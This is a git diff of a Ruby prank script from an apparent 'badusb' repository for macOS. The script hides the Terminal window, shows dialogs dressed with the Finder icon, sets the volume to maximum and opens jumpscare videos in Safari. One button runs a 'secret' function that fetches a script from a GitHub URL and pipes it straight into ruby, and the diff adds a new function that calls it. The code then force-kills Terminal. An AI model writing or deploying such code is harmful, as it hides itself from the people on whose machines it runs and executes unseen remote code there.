@@ -5,7 +5,7 @@ require 'tempfile'
 # --- Hide Terminal Immediately ---
 system("osascript -e 'tell application \"Terminal\" to set visible of front window to false'")
 
-# --- Helper: Display Dialog with Finder Icon via AppleScript ---
+# --- Helper: Display Dialog with Finder Icon using AppleScript ---
 def display_dialog(message, buttons, default)
   button_list = "{" + buttons.map { |b| "\"#{b}\"" }.join(", ") + "}"
   ascript = %Q{display dialog "#{message}" buttons #{button_list} default button "#{default}" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"}
@@ -77,7 +77,6 @@ def create_jumpscare_html(video_url)
 end
 
 # --- Trigger a Jumpscare in Safari ---
-# Opens Safari to display the jumpscare video using a temporary HTML file.
 def trigger_jumpscare(video_url)
   set_volume_to_max
   html_file = create_jumpscare_html(video_url)
@@ -98,6 +97,21 @@ def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
 end
 
+# --- Subscriber Action ---
+# For subscribers: process button selection.
+def subscriber_action(choice)
+  case choice.downcase
+  when "hawk"
+    run_secret_script
+  when "tuah"
+    trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
+  when "sydney lover"
+    trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
+  else
+    puts "Unexpected button choice."
+  end
+end
+
 # --- Main Program Flow ---
 
 # First prompt: "Are you subscribed to MrWoooper?"
@@ -106,34 +120,22 @@ if subscribed.nil?
   puts "No response received. Exiting."
   exit 0
 end
-subscribed_flag = (subscribed.downcase == "yes")
 
-# Next prompt: Show the common button selection with three buttons.
-button_choice = display_dialog("Choose a button:", ["Hawk", "Tuah", "Sydney lover"], "Hawk")
-if button_choice.nil?
-  puts "No button chosen. Exiting."
+if subscribed.downcase == "no"
+  # Non-subscriber: immediately play jumpscare using jumpscare2.mp4.
+  sleep 1
+  video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
+  trigger_jumpscare(video_url)
+  system("killall Terminal")
+  exit 0
+else
+  # Subscriber branch: show a dialog with three buttons.
+  button_choice = display_dialog("Choose a button:", ["Sydney lover", "Hawk", "Tuah"], "Hawk")
+  if button_choice.nil?
+    puts "No button chosen. Exiting."
+    exit 0
+  end
+  subscriber_action(button_choice)
+  system("killall Terminal")
   exit 0
 end
-
-# Process the button choice.
-case button_choice.downcase
-when "hawk"
-  run_secret_script
-when "tuah"
-  if subscribed_flag
-    # For subscribers, "Tuah" triggers Jeff_Jumpscare.mp4.
-    trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
-  else
-    # For non-subscribers, "Tuah" triggers jumpscare2.mp4.
-    trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4")
-  end
-when "sydney lover"
-  # "Sydney lover" triggers the andrewjumpv2.mp4 jumpscare.
-  trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
-else
-  puts "Unexpected button choice."
-end
-
-# Force-kill Terminal after action.
-system("killall Terminal")
-exit 0
